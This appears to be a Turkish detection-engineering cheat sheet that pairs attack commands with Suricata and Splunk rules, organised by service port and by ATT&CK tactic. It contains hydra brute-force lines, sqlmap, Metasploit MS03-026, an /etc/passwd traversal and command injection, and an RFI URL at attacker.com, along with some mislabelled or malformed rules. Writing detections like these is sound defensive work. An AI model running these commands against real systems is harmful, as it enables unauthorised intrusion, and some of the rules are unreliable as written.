```plaintext
alert tcp any any -> $HOME_NET 21 (msg:"Possible FTP Brute Force Attack"; flow:to_server,established; content:"Login incorrect"; sid:100001;)
```

- **Splunk Rule**

```plaintext
index=network sourcetype=ftp-logs "530 Login incorrect" 
| stats count by src_ip 
| where count > 5
```

##### **2. Anonymous FTP Access**

*Not: Bazı FTP sunucuları "anonymous" kullanıcı adıyla kimlik doğrulama yapmadan girişe izin verir. Bu, saldırganlar için bir giriş noktası olabilir.*  

- **Attack Command**

  - ftp [target_IP]
  - [Username: anonymous]

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 21 (msg:"Anonymous FTP Login"; flow:to_server,established; content:"230 Anonymous access granted"; sid:100002;)
```

- **Splunk Rule**

```plaintext
index=network sourcetype=ftp_logs "230 Anonymous access granted" 
| stats count by src_ip
```

##### **3. PASV FTP Trafiği Tespiti**

*Not: PASV modu, FTP'nin veri bağlantısını istemcinin başlatmasını sağlar. Bu modda veri transferi izlenebilir.*

- **Attack Command** (PASV modunda FTP transferi, spesifik bir saldırı komutu değildir):

  - ftp [target-IP]
  - [username]
  - [password]
  - pasv

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 21 (msg:"FTP PASV Mode Detected"; flow:to_server,established; content:"227 Entering Passive Mode"; sid:100003;)
```

- **Splunk Rule**

```plaintext
index=network sourcetype=ftp_logs "227 Entering Passive Mode" 
| stats count by src_ip
```

#### **22 - SSH**

SSH protokolü, şifreli bir iletişim kanalı sağlar ancak brute force ve kullanıcı doğrulama saldırılarına karşı hassas olabilir.

##### **1. Brute Force Attack (SSH)**

*Not: SSH brute force saldırıları, genellikle sistemin SSH giriş denemelerinin limitlerini zorlamak için yapılır.*  

- **Attack Command**

```bash
hydra -l [username] -P [password_list.txt] ssh://[target-IP]
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 22 (msg:"Possible SSH Brute Force Attack"; flow:to_server,established; content:"Failed password"; sid:100010;)
```

- **Splunk Rule**

```plaintext
index=network sourcetype=ssh_logs "Failed password" 
| stats count by src_ip 
| where count > 5
```

##### **2. SSH User Enumeration**

*Not: Kullanıcı doğrulama saldırıları, geçerli kullanıcı adlarını belirlemek için kullanılır.*  

- **Attack Command** (Örneğin, `ssh-user-enum` aracı kullanılarak):

```bash
python ssh-user-enum.py -U users.txt -t [target-IP]
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 22 (msg:"Potential SSH User Enumeration"; flow:to_server,established; threshold: type limit, track by_src, count 10, seconds 60; sid:100011;)
```

- **Splunk Rule**

```plaintext
index=network sourcetype=ssh_logs ("Failed" OR "Invalid user") 
| stats count by src_ip 
| where count > 10
```

#### **23 - Telnet**

Telnet protokolü, şifreleme olmaksızın iletişim sağlar ve bu nedenle brute force, banner grabbing ve düz metin şifre saldırılarına açıktır.

##### **1. Brute Force Attack (Telnet)**

*Not: Telnet oturumlarında başarısız giriş denemeleri genellikle "Login incorrect" gibi yanıtlar verir.*  

- **Attack Command**

```bash
hydra -l [username] -P [password_list.txt] telnet://[target_IP]
```

- **Splunk Rule**

```yaml
alert tcp any any -> $HOME_NET 23 (msg:"Possible Telnet Brute Force Attack"; flow:to_server,established; content:"Login incorrect"; sid:100020;)
```

- **Splunk Rule**

```spl
index=network sourcetype=telnet_logs "Login incorrect" 
| stats count by src_ip 
| where count > 5
```

##### **2. Telnet Banner Grabbing**

*Not: Banner grabbing, sunucunun adını ve özelliklerini öğrenmek için yapılır.*  

- **Attack Command**

```bash
telnet [target_IP] 23
```

- **Splunk Rule**

```yaml
alert tcp any any -> $HOME_NET 23 (msg:"Telnet Banner Grabbing Detected"; flow:to_server,established; content:"Welcome to"; sid:100021;)
```

- **Splunk Rule**

```spl
index=network sourcetype=telnet_logs "Welcome to" 
| stats count by src_ip
```

##### **3. Telnet Clear-text Credentials**

*Not: Telnet, kullanıcı adı ve şifre gibi kimlik bilgilerini düz metin olarak ilettiği için güvenli değildir.*  

- **Attack Command**

Bu, spesifik bir saldırı komutu içermeyen, normal bir telnet giriş oturumudur.

- **Splunk Rule**

```yaml
alert tcp any any -> $HOME_NET 23 (msg:"Possible Clear-text Credentials in Telnet"; flow:to_server,established; content:"PASSWORD"; nocase; sid:100022;)
```

- **Splunk Rule**

```spl
index=network sourcetype=telnet_logs "PASSWORD" 
| stats count by src_ip
```

#### **25 - SMTP**

SMTP, e-posta iletimi için kullanılan bir protokoldür. Kullanıcı doğrulama ve relay abuse gibi saldırılara açıktır.

##### **1. SMTP User Enumeration**

*Not: VRFY komutu, geçerli kullanıcı adlarını doğrulamak için kullanılabilir.*  

- **Attack Command**

```bash
smtp-user-enum -M VRFY -U users.txt -t [target_IP]
```

- **Splunk Rule**

```yaml
alert tcp any any -> $HOME_NET 25 (msg:"SMTP VRFY Command User Enumeration"; flow:to_server,established; content:"VRFY"; nocase; sid:100030;)
```

- **Splunk Rule**

```spl
index=network sourcetype=smtp_logs "VRFY" 
| stats count by src_ip 
| where count > 5
```

##### **2. SMTP Relay Abuse**

*Not: Relay abuse saldırıları, bir SMTP sunucusunu spam e-posta göndermek için kötüye kullanmayı içerir.*  

- **Attack Command**

```bash
swaks --to victim@example.com --from attacker@example.com --server [target_IP]
```

- **Splunk Rule**

```yaml
alert tcp any any -> $HOME_NET 25 (msg:"Potential SMTP Relay Abuse"; flow:to_server,established; content:"RCPT TO"; nocase; sid:100031;)
```

- **Splunk Rule**

```spl
index=network sourcetype=smtp_logs "RCPT TO" 
| stats count by src_ip 
| where count > 10
```

##### **2. SMTP Banner Grabbing**

*Banner grabbing, bir hizmetin (örneğin SMTP) banner bilgisini alarak hizmetin versiyonunu ve diğer detayları öğrenme işlemidir.*

- **Attack Command**

```bash
telnet [hedef_IP] 25
```

Bu komut, 25 numaralı port üzerinden SMTP hizmetine bağlanır ve genellikle SMTP sunucusunun versiyonunu belirten bir banner döndürülecektir.

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 25 (msg:"SMTP Banner Grabbing Tespit Edildi"; flow:to_server,established; content:"220"; sid:100032;)
```

Bu kural, SMTP sunucusunun 220 yanıtını içeren bir banner döndürmesi durumunda tetiklenir. "220" yanıtı, genellikle SMTP sunucusunun banner yanıtıdır.

- **Splunk Kuralı**

```spl
index=network sourcetype=smtp_logs "220" 
| stats count by src_ip
```

Bu kural, SMTP loglarında "220" içeriğini arar ve kaydeder. Bu, SMTP sunucusundan alınan bir banner yanıtını gösterir ve kaynak IP adreslerine göre sayım yapılır.

#### **53 - DNS**

##### **1. DNS Zone Transfer**

*DNS Zone Transfer (AXFR), DNS veritabanının bir kopyasını almak için yapılan sorgulardır. Bu, özellikle yanlış yapılandırılmış DNS sunucuları üzerinde saldırganlar için büyük bir güvenlik açığı olabilir.*

- **Attack Command**

```bash
dig axfr @target_IP domain.com
```

Bu komut, belirli bir domain için DNS zone transferi yapmayı amaçlar. Eğer DNS sunucu doğru şekilde yapılandırılmamışsa, bu komutla tüm DNS kayıtları ele geçirilebilir.

- **Suricata Rule**

```plaintext
alert udp any any -> $HOME_NET 53 (msg:"Potansiyel DNS Zone Transfer AXFR Sorgusu"; content:"|00 FC|"; sid:200001;)
```

Bu kural, DNS sunucusuna yapılan AXFR (zone transfer) sorgularını tespit eder. AXFR sorgusu, DNS zone transferi için yapılan özel bir istek olup, belirli bir içerik (|00 FC|) ile tespit edilebilir.

- **Splunk Kuralı**

```spl
index=network sourcetype=dns_logs "AXFR" 
| stats count by src_ip 
| where count > 1
```

Bu kural, DNS loglarında "AXFR" terimini arar ve kaynak IP adreslerine göre sayım yapar. Eğer aynı kaynaktan birden fazla AXFR isteği gelirse, bu potansiyel bir DNS zone transferi girişimi olabilir.

##### **2. DNS Reconnaissance**

*DNS reconnaissance, hedefin DNS kayıtlarını toplamak için yapılan keşif işlemleridir. Bu tür bir keşif, DNS sorguları aracılığıyla hedef hakkında bilgi toplamak amacıyla yapılır.*

- **Attack Command**

```bash
nslookup -type=ANY domain.com target_IP
```

Bu komut, belirli bir domain için "ANY" tipi DNS sorgusu yapar. Bu sorgu, o domain hakkında çeşitli DNS kayıtlarını almak için kullanılır.

- **Suricata Rule**

```plaintext
alert udp any any -> $HOME_NET 53 (msg:"Potansiyel DNS Keşfi"; flow:to_server; content:"|00 FF|"; sid:200002;)
```

Bu kural, DNS sunucusuna yapılan potansiyel keşif işlemlerini tespit eder. DNS keşfi, genellikle `ANY` türündeki sorgularla yapılır ve bu tür sorgular, belirli bir içerik (|00 FF|) ile tespit edilebilir.

- **Splunk Kuralı**

```spl
index=network sourcetype=dns_logs query_type=ANY 
| stats count by src_ip 
| where count > 5
```

Bu kural, DNS loglarında "ANY" sorgusu yapan kaynak IP'leri arar ve her IP için sorgu sayısını sayar. Eğer bir kaynaktan 5'ten fazla "ANY" sorgusu yapılırsa, bu potansiyel bir DNS keşfi girişimi olarak değerlendirilebilir.

##### **3. DNS Amplification Attack**

*DNS Amplification saldırısı, DNS sunucularını kullanarak hedefe büyük miktarda trafik yönlendiren bir DDoS saldırı türüdür. Bu saldırılar genellikle açık DNS sunucuları kullanılarak gerçekleştirilir.*

- **Attack Command**

```bash
## Bu saldırı, özel araçlar veya scriptler kullanılarak yapılır.
```

- **Suricata Rule**

```plaintext
alert udp any any -> $HOME_NET 53 (msg:"Potansiyel DNS Amplifikasyon Saldırısı"; flow:to_server,established; content:"|00 00 FF 00 01|"; sid:200003;)
```

Bu kural, DNS Amplification saldırısına işaret eden içerik (|00 00 FF 00 01|) tespit eder.

- **Splunk Kuralı**

```spl
index=network sourcetype=dns_logs 
| stats avg(length) by src_ip 
| where avg(length) > 5000
```

Bu kural, DNS loglarında anormal derecede uzun paketler gönderen IP'leri tespit eder, bu da potansiyel bir DNS Amplification saldırısına işaret edebilir.

#### **80 - HTTP**

##### **1. Directory Enumeration**

*Directory enumeration saldırısı, hedef web sunucusunda gizli veya korunmasız dizinlerin keşfi amacıyla yapılan bir saldırıdır. Bu saldırı, belirli dosya uzantıları veya dizin adlarıyla yapılan HTTP istekleriyle gerçekleştirilir.*

- **Attack Command**

```bash
dirb http://target_IP/
```

Bu komut, hedef IP'deki dizinleri ve dosyaları keşfetmeye çalışır.

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel Dizin Dizin Keşfi Saldırısı"; flow:to_server,established; content:"GET"; pcre:"/(\.bak|\.old|\.backup|admin|login)/i"; sid:210001;)
```

Bu kural, dizin ve dosya keşfi amacıyla yapılan GET isteklerini tespit eder. Özellikle `.bak`, `.old`, `.backup`, `admin`, ve `login` gibi şüpheli yolları arar.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs status=404 
| top limit=20 uri_path
```

Bu kural, 404 hata koduyla dönen en yaygın URI yollarını listeler. Bu, dizin keşfi sırasında sıkça karşılaşılan yolları gösterebilir.

##### **2. SQL Injection**

*SQL Injection saldırısı, web uygulamalarındaki güvenlik açıklarından yararlanarak veritabanı sorgularına kötü amaçlı kod eklenmesiyle yapılır. Bu tür saldırılar, genellikle kullanıcının girdiği verilerin doğrulanmaması nedeniyle meydana gelir.*

- **Attack Command**

```bash
sqlmap -u "http://target_IP/page.php?id=1"
```

Bu komut, belirtilen URL'de SQL Injection açığı olup olmadığını kontrol etmek için `sqlmap` aracını kullanır.

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel SQL Injection Saldırısı"; flow:to_server,established; content:"GET"; pcre:"/UNION|SELECT|DROP|OR 1=1'/i"; sid:210002;)
```

Bu kural, HTTP GET isteklerinde SQL Injection saldırılarına yönelik yaygın şüpheli kalıpları tespit eder. "UNION", "SELECT", "DROP" ve "OR 1=1" gibi ifadeler SQL Injection saldırılarında sıkça kullanılır.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| regex uri_query=".*(UNION|SELECT|DROP|OR 1=1).*" 
| stats count by client_ip, uri_query
```

Bu kural, SQL Injection saldırılarını tespit etmek için URL sorgularında "UNION", "SELECT", "DROP" ve "OR 1=1" gibi ifadeleri arar. Ayrıca saldırının kaynağını belirlemek için IP adresini listeler.

İşte **HTTP Flood (DDoS)** saldırısı için Türkçe ve uygun formatta açıklamalar:

##### **3. HTTP Flood (DDoS)**

*HTTP Flood saldırısı, bir hedef sunucunun kaynaklarını tüketmek için yoğun sayıda HTTP isteği gönderilerek gerçekleştirilir. Bu tür saldırılar genellikle botnet'ler veya özel araçlar kullanılarak yapılır.*

- **Attack Command**

```plaintext
## Bu tür saldırılar, özel DDoS araçları veya botnet'ler ile gerçekleştirilir.
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel HTTP Flood Saldırısı"; flags:PA; threshold:type volume, track by_src, count 100, seconds 10; sid:210003;)
```

Bu kural, bir istemciden gelen 10 saniye içinde 100 veya daha fazla HTTP isteğini tespit ederek HTTP Flood saldırılarını belirler.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| stats count by client_ip 
| sort - count 
| head 20
```

Bu kural, en fazla istek gönderen istemci IP'lerini sıralar ve ilk 20 IP adresini listeler. Yüksek yoğunlukta istek gönderen IP'ler HTTP Flood saldırısını gösterebilir.

İşte **Directory Traversal** saldırısı için Türkçe ve uygun formatta açıklamalar:

##### **4. Directory Traversal**

*Directory Traversal saldırıları, hedef sunucudaki yetkisiz dosyalara erişmek için dizinlerin yukarı çıkılarak gerçekleştirilir. Bu saldırı genellikle `etc/passwd` gibi kritik dosyaları hedef alır.*

- **Attack Command**

```plaintext
curl http://target_IP/../../etc/passwd
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel Directory Traversal Saldırısı"; flow:to_server,established; content:"GET"; pcre:"/\.\.\//"; sid:210005;)
```

Bu kural, HTTP GET isteklerinde ".." ile dizinlerin yukarı çıkılmaya çalışıldığını tespit ederek Directory Traversal saldırılarını belirler.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| regex uri_path=".*\.\./.*" 
| stats count by client_ip, uri_path
```

Bu kural, URI yolunda `../` dizin çıkışını içeren istekleri analiz eder ve bu tür istekleri gönderen IP adreslerini listeler.

İşte **Command Injection** saldırısı için Türkçe ve uygun formatta açıklamalar:

##### **5. Command Injection**

*Command Injection saldırıları, bir uygulamanın çalıştırdığı komutlara kötü niyetli girdiler enjekte ederek sistem komutlarını çalıştırmayı hedefler. Bu saldırı, genellikle komut yürütme parametrelerini hedefler.*

- **Attack Command**

```plaintext
curl "http://target_IP/command.php?cmd=cat%20/etc/passwd"
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel Komut Enjeksiyonu Saldırısı"; flow:to_server,established; content:"GET"; pcre:"/(\?|&)(cmd|exec|system|shell_exec)=/"; sid:210006;)
```

Bu kural, HTTP GET isteklerinde `cmd=`, `exec=`, `system=`, veya `shell_exec=` gibi kritik anahtar kelimeleri tespit ederek komut enjeksiyonu saldırılarını belirler.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| regex uri_query=".*(\?|&)(cmd|exec|system|shell_exec)=.*" 
| stats count by client_ip, uri_query
```

Bu kural, URI sorgularında komut enjeksiyonu amaçlı kullanılan anahtar kelimeleri analiz eder ve bu tür istekleri gönderen IP adreslerini listeler.

##### **6. HTTP Request Smuggling**

*HTTP Request Smuggling, istemci ve sunucu arasındaki HTTP isteklerinin farklı yorumlanması nedeniyle güvenlik açıklarından yararlanmayı amaçlayan bir saldırıdır. Bu saldırı, genellikle iki farklı sunucu arasında farklı HTTP başl ıklarını kullanarak gerçekleştirilir.*

- **Attack Command**

```plaintext
## Bu saldırı genellikle özel bir araç (ör. Burp Suite) kullanılarak gerçekleştirilir ve HTTP istekleri manuel olarak düzenlenir.
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel HTTP Request Smuggling Saldırısı"; flow:to_server,established; content:"Transfer-Encoding: chunked"; content:"Content-Length:"; distance:0; sid:210007;)
```

Bu kural, aynı istekte hem "Transfer-Encoding: chunked" hem de "Content-Length" başlıklarını tespit ederek HTTP Request Smuggling saldırısını belirlemeyi hedefler.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| search header_transfer_encoding="chunked" AND header_content_length="*" 
| stats count by client_ip
```

Bu kural, HTTP isteklerinde "Transfer-Encoding: chunked" ve "Content-Length" başlıklarının aynı anda bulunduğu durumları analiz eder ve saldırganın IP adreslerini belirler.

İşte **Header Injection** saldırısı için Türkçe ve uygun formatta açıklamalar:

##### **7. Header Injection**

*Header Injection, HTTP isteklerinde özel başlık değerleri enjekte ederek sunucunun beklenmedik davranışlar sergilemesine neden olan bir saldırı türüdür. Bu saldırılar genellikle ek bilgiler sızdırmak, yönlendirmeleri manipüle etmek veya zararlı işlemler gerçekleştirmek amacıyla kullanılır.*

- **Attack Command**

```plaintext
curl -H "X-Custom-Header: injected value" http://target_IP/
```

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 80 (msg:"Potansiyel Header Injection Saldırısı"; flow:to_server,established; content:"X-Custom-Header"; sid:210008;)
```

Bu kural, HTTP isteklerinde özel "X-Custom-Header" başlığının varlığını kontrol ederek Header Injection saldırılarını tespit eder.

- **Splunk Kuralı**

```spl
index=web sourcetype=access_logs 
| search header_X-Custom-Header="*" 
| stats count by client_ip, header_X-Custom-Header
```

Bu kural, HTTP isteklerinde "X-Custom-Header" başlığına sahip verileri arar ve hangi istemcilerin bu başlığı gönderdiğini analiz eder.

#### **135 - RPC**

##### **RPC Dump ve MS03-026 DCOM Exploit**

*Bu saldırılar, Windows sistemlerinde kullanılan Uzaktan Prosedür Çağrısı (RPC) hizmetlerini hedefler. RPC Dump, sistemde çalışan RPC servislerinin UUID ve uç noktalarını listelemek için kullanılır. MS03-026 DCOM Exploit ise eski Windows sistemlerde bulunan bir güvenlik açığını sömürmek için kullanılır.*

###### **1. RPC Dump**

- **Attack Command**

```plaintext
rpcdump.py @target_IP
```

Bu komut, hedefte çalışan RPC servislerini ve uç noktalarını listeler.

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 135 (msg:"Potansiyel RPC Listeleme Saldırısı"; flow:to_server,established; content:"|05 00 0b|"; depth:5; sid:220001;)
```

Bu kural, RPC dump işlemi sırasında gönderilen karakteristik veriyi tespit eder.

- **Splunk Kuralı**

```spl
index=network sourcetype=traffic_logs dest_port=135 
| search payload="*05 00 0b*" 
| stats count by src_ip
```

Bu kural, RPC dump işlemini gerçekleştiren istemcilerin IP adreslerini ve oturumlarını tespit eder.

###### **2. MS03-026 DCOM Exploit**

- **Attack Command**

```plaintext
msfconsole
use exploit/windows/dcerpc/ms03_026_dcom
set RHOST target_IP
exploit
```

Bu komutlar, eski Windows sistemlerdeki DCOM güvenlik açığını sömürmek için Metasploit Framework kullanır.

- **Suricata Rule**

```plaintext
alert tcp any any -> $HOME_NET 135 (msg:"Potansiyel MS03-026 DCOM Exploit Saldırısı"; flow:to_server,established; content:"|04 00 01 00|"; depth:10; sid:220002;)
```

Bu kural, MS03-026 DCOM Exploit saldırısını gerçekleştirmek için kullanılan belirli paketleri tespit eder.

- **Splunk Kuralı**

```spl
index=network sourcetype=traffic_logs dest_port=135 
| search payload="*04 00 01 00*" 
| stats count by src_ip
```

Bu kural, MS03-026 DCOM Exploit saldırılarını gerçekleştiren istemcileri belirler.

#### **139 - NetBIOS**

##### **1. NetBIOS İsim Listeleme**

- **Attack Command**  
NetBIOS protokolü üzerinden isim listeleme işlemini gerçekleştirmek için aşağıdaki komut kullanılır:

```plaintext
nbtscan target_IP
```  

- **Suricata Rule**  
Bu kural, TCP 139 portuna gelen ve NetBIOS isim listelemeye yönelik bir isteği tespit eder.

```plaintext
alert tcp any any -> $HOME_NET 139 (msg:"Potansiyel NetBIOS İsim Listeleme"; flow:to_server,established; content:"|00 00 00 20|"; depth:10; sid:230001;)
```  

- **Splunk Kuralı**  
Bu kural, NetBIOS isim listeleme saldırısını tespit etmek için Splunk kullanılarak oluşturulmuştur.  

```spl
index=network sourcetype=traffic_logs dest_port=139 
| search payload="*00 00 00 20*" 
| stats count by src_ip
```

##### **2.NetBIOS DoS (Hizmet Reddi) Saldırısı**

- **Attack Command**
NetBIOS protokolünü hedef alarak hizmet reddi saldırısını gerçekleştirmek için aşağıdaki komut kullanılabilir:

```plaintext
nmap -p 139 --script netbios-dos target_IP
```  

- **Suricata Rule**  
Bu kural, TCP 139 portuna yönelik NetBIOS DoS saldırısını tespit eder:

```plaintext
alert tcp any any -> $HOME_NET 139 (msg:"Potansiyel NetBIOS DoS Saldırısı"; flow:to_server,established; content:"|00 00 00 85|"; depth:10; sid:240001;)
```  

- **Splunk Kuralı**
Bu kural, NetBIOS DoS saldırılarını Splunk kullanarak analiz etmek için kullanılır:  

```spl
index=network sourcetype=traffic_logs dest_port=139 
| search payload="*00 00 00 85*" 
| stats count by src_ip
```

#### **445 - SMB**

##### **SMB Versiyon Kontrolü**

- **Saldırı Komutu**  
SMB protokolü versiyon kontrolünü gerçekleştirmek için aşağıdaki komut kullanılabilir:

```plaintext
nmap -p 445 --script smb-protocols target_IP
```  

- **Suricata Rule**  
Bu kural, TCP 445 portuna yönelik SMB versiyon kontrol saldırısını tespit eder:

```plaintext
alert tcp any any -> $HOME_NET 445 (msg:"Potansiyel SMB Versiyon Kontrolü"; flow:to_server,established; content:"|72 00 00 00|"; depth:10; sid:250001;)
```  

- **Splunk Kuralı**  
Bu kural, SMB versiyon kontrolü saldırılarını Splunk kullanarak analiz etmek için kullanılır:

```spl
index=network sourcetype=traffic_logs dest_port=445 
| search payload="*72 00 00 00*" 
| stats count by src_ip
```

### **Resource Development**

- **Acquire Infrastructure:** Saldırganların, hedeflere yönelik saldırıları başlatabilmek için gerekli altyapıyı (sunucular, IP adresleri, bulut hizmetleri vb.) edinmesi. Bu, sahte web siteleri veya zararlı yazılım dağıtım ağları gibi kaynakları içerir.

- **Establish Accounts:** Saldırganların, hedef sistemlere erişim sağlamak amacıyla kullanıcı hesapları oluşturması veya var olan hesapları ele geçirmesi. Bu, kimlik bilgisi hırsızlığı veya şifre sıfırlama gibi yöntemleri içerebilir.

- **Gather Technical Information:** Hedef sistemler ve ağlar hakkında teknik bilgi toplamak. Bu, ağ yapılandırması, yazılım sürümleri, açıklar veya hedefin savunma mekanizmaları hakkında veri toplamayı içerebilir.

- **Purchase Technical Data:** Saldırganların, hedefle ilgili teknik veriler veya zafiyet bilgilerini yasa dışı yollarla satın alması. Bu veriler, hedefin güvenlik açıklarını daha iyi anlamalarına ve daha etkili saldırılar düzenlemelerine yardımcı olabilir.

- **Develop Capabilities:** Saldırganların, kendi saldırı yeteneklerini geliştirmesi. Bu, zararlı yazılımlar, exploit’ler veya sosyal mühendislik araçları gibi saldırı tekniklerinin yaratılmasını ve test edilmesini içerebilir.

#### **Acqurie Infrastructure**

- **Splunk Rule**

```spl
index=network sourcetype=firewall_logs dest_ip="1.2.3.4"
| stats count by src_ip, dest_ip, dest_port
| where count > 100
```

- **Suricata Rule**

```plaintext
alert ip any any -> 1.2.3.4 any (msg: "Suspicious IP address detected"; sid:10001; rev:1;)
```

#### **Links to New Domains**

- **Splunk Rule**

```spl
index=network sourcetype=dns_logs query="*.malicious-domain.com"
```

- **Suricata Rule**

```plaintext
alert dns any any -> any 53 (msg:"Suspicious domain query detected"; content:"malicious-domain.com"; sid:100002; rev:1;)
```

#### **Connections to Suspicious SSH Server**

- **Splunk Rule**

```spl
index=network sourcetype=ssh_logs dest_ip="2.3.4.5"
```

- **Suricata Rule**

```plaintext
alert tcp any any -> 2.3.4.5 22 (msg: "Suspicious SSH connection detected"; sid:10003; rev:1;)
```

#### **Links to New or Suspiciouse Cloud Infrastructures**

- **Splunk Rule**

```spl
index=network sourcetype=firewall_logs dest_ip="3.5.7.*"
```

- **Suricata Rule**

```plaintext
alert ip any any -> [3.5.7.0/24] any (msg: "Connection to suspicious cloud infrastructure detected"; sid:10004; rev:1;)
```

### **Initial Access**

- **Drive-by Compromise:** Bir kullanıcının, zararlı bir web sitesini ziyaret ettiğinde, herhangi bir etkileşimde bulunmadan otomatik olarak saldırgan tarafından kötü amaçlı yazılımla enfekte edilmesi. Bu tür saldırılar genellikle internet tarayıcıları ve eklentiler aracılığıyla yapılır.

- **Exploit Public-Facing Application:** Halkla erişilebilen uygulamalarda (örneğin, web uygulamaları) güvenlik açıklarından yararlanarak sisteme erişim sağlamak. Bu, örneğin SQL enjeksiyonu veya uzaktan kod çalıştırma gibi açıkların exploit edilmesiyle olabilir.

- **External Remote Services:** Dışarıdan uzaktan erişim sağlanan servisleri hedef almak. Örneğin, VPN, RDP veya SSH gibi servisler üzerinden, güvenlik açıklarından veya zayıf şifrelerden yararlanarak erişim sağlamak.

- **Hardware Additions:** Fiziksel cihazların (USB bellekler, kötü amaçlı donanımlar, vb.) sisteme bağlanmasıyla gerçekleştirilen ilk erişim. Bu, saldırganın cihazları doğrudan kurbanın sistemine yerleştirerek veya cihazları uzaktan çalıştırarak erişim sağlaması anlamına gelir.

- **Phishing:** Kullanıcıları kandırarak, genellikle e-posta yoluyla kimlik bilgilerini çalmak. Kullanıcıyı, genellikle meşru görünen ancak aslında kötü amaçlı bir web sitesine yönlendiren mesajlar içerir.

- **Spearphishing Attachment:** Phishing saldırısının daha hedeflenmiş bir versiyonudur. Saldırgan, belirli bir kişiyi veya organizasyonu hedef alarak, kötü amaçlı dosya veya ekler içeren e-postalar gönderir. Bu ekler genellikle zararlı yazılımlar içerir.

- **Supply Chain Compromise:** Tedarik zincirindeki bir zayıflığı hedef almak. Saldırganlar, bir organizasyonun üçüncü taraf tedarikçilerini veya yazılım sağlayıcılarını hedef alarak, kötü amaçlı yazılım veya hasar vermek için arka kapılar kurar.

- **Trusted Relationship:** Güvenilen bir ilişkiyi (örneğin, iş ortakları, tedarikçiler veya hizmet sağlayıcıları) kullanarak sisteme erişim sağlamak. Bu, bir organizasyonun güvenlik kontrolleri tarafından genellikle daha az şüpheyle karşılanan ilişkileri kötüye kullanmayı içerir.

- **Valid Accounts:** Meşru kullanıcı hesapları kullanarak sisteme erişim sağlamak. Bu, şifrelerin çalınması, şifre tahmin etme veya kimlik doğrulama verilerinin başka yollarla ele geçirilmesiyle yapılabilir. Saldırganlar, bu geçerli hesapları kullanarak yetkisiz erişim elde eder.

#### **Drive-by Compromise**

An attacker complicates a website or creates a malicious website

- **Splunk Rule**

```spl
index=weblogs host="compromised-website.com"
| timechart count by http_status 
| where count > threshold_value
```

- **Suricata Rule**

```plaintext
alert http any any -> any 80 (msg:"Known malicious payload detected"; content:"malicious-string-or-pattern"; http_uri; sid:100005; rev:1;)
```

#### **Exploit Public Facing Application**

##### 1. **SQL Injection**

- **Attack Command**

Attack Command: `OR T-T; --`

- **Splunk Rule**

```spl
index=weblogs
| regex raw=".*(' OR T-T--)*"
| table src_ip, dest_ip, url, user_agent, raw
```

##### 2. **Remote File Inclusion (RFI)**

- **Attack Command:** `http://attacker.com/malicious-file.php`

- **Suricata Rule**

```suricata
alert http any any -> any 80 (msg:"Potential RFI detected"; content:"malicious-file.php"; http_uri; sid:100006; rev:1;)
```

#### **External Remote Services**

##### **RDP Brute Force**

- **Attack Command**
  
  ```plaintext
  hydra -t 1 -V -f -I administrator -P /path/to/passwordlist.txt rdp://targetIP
  ```

- **Splunk Rule**

  ```spl
  index-windows_security_logs EventCode=4625
  | stats count by src_ip, dest_ip
  | where count > threshold_value
  ```

##### **SSH Brute Force**

- **Attack Command**

  ```plaintext
  hydra -I root -P /path/to/passwordlist.txt ssh://targetIP
  ```

- **Suricata Rule**

  ```suricata
  alert tcp any any -> any 22 (msg:"Multiple SSH connection attempts"; flowto:next_rule;)
  ```

### **Execution**

MITRE ATT&CK Execution kategorisi, saldırganların hedef sistemde kötü amaçlı yazılımlarını çalıştırma ve işlemleri yürütme yollarını içerir. İşte bu tekniklerin kısaca açıklamaları:

1. **Command and Scripting Interpreter:** Saldırganların hedef sistemde komut satırı veya betik dili aracılığıyla komutlar çalıştırmasına izin verir. Örneğin, PowerShell veya bash kullanılabilir.

2. **Windows Management Instrumentation (WMI):** Windows işletim sistemlerinde kullanılan bir yönetim aracıdır. Saldırganlar, uzaktan komutlar çalıştırmak veya sistemde bilgi toplamak için WMI'yi kullanabilirler.

3. **Scheduled Task:** Zamanlanmış görevler, belirli bir zamanda veya belirli bir aralıkla çalışacak komutlar ayarlamak için kullanılır. Saldırganlar bu özellikten yararlanarak zararlı yazılımları arka planda çalıştırabilir.

4. **Service Execution:** Windows hizmetlerini (services) kullanarak kötü amaçlı yazılımların çalıştırılmasıdır. Hizmetler, sistem başlangıcında otomatik olarak çalıştırılabilir, bu da saldırganlara sürekli erişim sağlar.

5. **Third-party Software:** Üçüncü taraf yazılımlarının güvenlik açıklarından yararlanarak veya yazılımın çalışma ortamını kullanarak saldırganların kötü amaçlı yazılımlarını çalıştırmasıdır.

6. **User Execution:** Kullanıcı tarafından tetiklenen bir etkinlik, örneğin bir e-posta eki açmak veya bir bağlantıyı tıklamak, zararlı yazılımın çalışmasına yol açabilir. Bu teknik, sosyal mühendislik kullanarak kullanıcıyı kandırmayı içerir.

7. **Exploitation for Client Execution:** Kullanıcının bir istemci uygulamasında (tarayıcı, PDF okuyucu vb.) bir güvenlik açığından yararlanarak zararlı yazılımı çalıştırmak. Bu, genellikle bir zayıflığı hedef alarak kullanıcıyı kandırmayı içerir.

8. **System Services:** Sistem hizmetlerini veya arka planda çalışan uygulamaları kullanarak kötü amaçlı yazılımların çalıştırılmasıdır. Bu yöntem, sistemdeki mevcut hizmetleri kötüye kullanır.

